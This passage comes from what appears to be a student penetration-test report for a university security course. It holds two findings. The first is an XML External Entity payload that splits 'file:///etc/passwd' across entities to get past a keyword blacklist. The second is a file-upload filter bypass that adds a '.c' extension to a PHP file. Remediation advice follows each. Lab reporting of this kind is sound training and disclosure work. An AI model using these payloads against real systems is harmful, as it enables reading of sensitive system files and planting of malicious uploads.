   <!ENTITY % A "fil">
   <!ENTITY % B "e:///et">
   <!ENTITY % C "c/pas">
   <!ENTITY % D "swd">
   <!-- Concatenate the four path strings -->
   <!ENTITY % PATH "%A;%B;%C;%D;">
   ]>

   <rss>
       <channel>
      	 <item>
      		 <title></title>
      		 <link></link>
      		 <description>&PATH;</description>
      	 </item>
       </channel>
   </rss>
   ```

2) Point feedifier to the address that contains the RSS XML file  
3) The description will now contain `file:///etc/passwd`, which should have failed


**Impact**

**Medium Risk**

Bypassing blacklist restrictions will lead all security concerns that were intended to be addressed through the implementation of the blacklist. In this case, blacklisted keywords can be circumvented during an XML External Entity attack.

**Remediation**

- Compare the output/result data against the blacklist. Whilst this may not prevent RCE and other attacks, it will mitigate the ease of data leaking
- Disable processing of external entities

#### File Extension Filtering

**Vulnerability Details**

Web applications that allow users to upload files and contents often have some sort of file extension check, to ensure that the correct file type is uploaded. However it can be difficult - if not impossible - to guarantee that the uploaded file structurally adheres to its supposed file type. \
This may lead to security implications, where malicious files may be dropped onto servers by appending a fictitious file extension to bypass the filter.

**Proof of Concept / Steps to Reproduce**

The following websites are vulnerable

- gcc.-QBSITE-

1. Append the `.c` extension to a file (i.e. <code>[file-ext-filter-bypass.php.c](https://featherbear.cc/UNSW-COMP6443/post/report1/file-ext-filter-bypass.php.c)</code>)
2. Upload the file through the GCC service
3. The file now exists on the server, and is accessible


**Impact**

**Medium Risk**

This vulnerability allows any arbitrary file to be uploaded to the server - which may lead to a second stage attack (See Remote Code Execution::File Upload).

**Remediation**

- Perform heuristic analysis of file contents; however this may be resource intensive and will not guarantee safety
- Limit access and methods on the uploaded file
